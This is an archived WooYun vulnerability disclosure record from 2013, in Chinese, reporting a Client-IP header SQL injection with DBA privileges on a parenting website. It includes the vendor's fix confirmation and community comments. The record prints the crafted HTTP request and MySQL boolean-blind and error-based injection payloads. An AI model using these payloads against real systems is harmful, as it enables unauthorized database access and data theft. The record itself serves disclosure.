{"id": 7089, "wybug_id": "wooyun-2013-042980", "wybug_title": "父母网某站Client-IP的SQL注入（DBA权限）导致可跨库查询", "wybug_corp": "父母网", "wybug_author": "霍大然", "wybug_date": "2013-11-15 13:10", "wybug_open_date": "2013-12-30 13:11", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["信息泄露", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向公众公开  简要描述： 父母网某站Client-IP的sql注入（DBA权限）导致可跨库查询，论坛，taobao啥的都泄露 详细说明：  faxian.fumu.com\n\n注入：GET /include/toupiao.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Client-IP: *Cookie: 6yBB_fa86_lastvisit=1384479513; 6yBB_fa86_sid=P9mnMe; 6yBB_fa86_lastact=1384483197%09faxian.php%09Host: faxian.fumu.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*Place: (custom) HEADERParameter: Client-IP #1*    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: ' RLIKE IF(9693=9693,0x436c69656e742d49502c2a,0x28) AND 'rGQy'='rGQy    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: ' AND (SELECT 2979 FROM(SELECT COUNT(*),CONCAT(0x7162686671,(SELECT (CASE WHEN (2979=2979) THEN 1 ELSE 0 END)),0x717a697071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YJeP'='YJeP---web server operating system: Linux Ubuntuweb application technology: PHP 5.3.2back-end DBMS: MySQL 5.0\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  不深入了，省的象金蝶的那样   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-11-18 10:52 厂商回复： 收到，正在安排修复，非常感谢 最新状态： 2013-11-18：已修复，对 ip 进行过滤。  ", "replys": "漏洞评价：\n评论\n     2013-11-15 14:53 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  nice！    \n     2013-11-15 14:54 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  nice！    \n     2013-11-15 15:36 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  洞主，可否指教下、client-IP sql 是个什么情况……关注你好久了……    \n     2013-11-15 15:45 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @hkAssassin 可遇不可求啊。    \n     2013-11-15 15:59 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  @hkAssassin 不好泄露厂商信息啊，等公开里面有    \n     2013-11-15 19:25 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  坐等公开..    \n     2013-11-18 08:52 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  厂商已经不上线啦    \n     2013-11-18 12:12 |    \t\t父母网(乌云厂商)\t\t \n  @hkAssassin 很老的代码，公司小，人员流动大，不是专业的互联网公司，技术人员很薄弱。有些代码写的仓促，安全意识很薄弱，最近才搞懂sql注入是什么。所以多谢各位大大手下留情，帮忙改进。代码里要记录用户ip了，简单实用了环境变量  client-IP  没有过滤，非常囧。    \n     2013-11-18 12:13 |    \t\t父母网(乌云厂商)\t\t \n  @Huc-Unis  正在一边学习，一边处理，多谢各位    \n     2013-11-18 12:41 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  @父母网 快把我的也处理下吧~太高危了，直接拿下所有网站的权限！解析漏洞+文件上传！    \n     2013-11-18 12:45 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  @父母网 漏洞不确认之后，五天将向公众公开~我发的你们的漏洞明天就要公开啦！嘻嘻！就怕坏人用这个漏洞拿你们的服务器！    \n     2013-11-18 13:54 |    \t\t父母网(乌云厂商)\t\t \n  @Huc-Unis 已确认，多谢    \n     2013-11-19 13:03 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  @霍大然 意思是私信个联系方式，求调教一下，不影响厂商的……嘿……    \n     2013-11-19 13:05 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  @父母网 我没工作啊没工作……你收留我吗……哇哈哈哈……    \n     2013-11-19 13:06 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  @寂寞的瘦子 寂寞了是吧……帮你介绍几个妹子……要么……    \n     2013-11-19 13:13 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @hkAssassin 呵呵呵呵呵呵呵。    \n     2013-11-19 13:23 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  @Huc-Unis 貌似每个厂商出现这个问题都是直接一句话搞shell!!!!    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}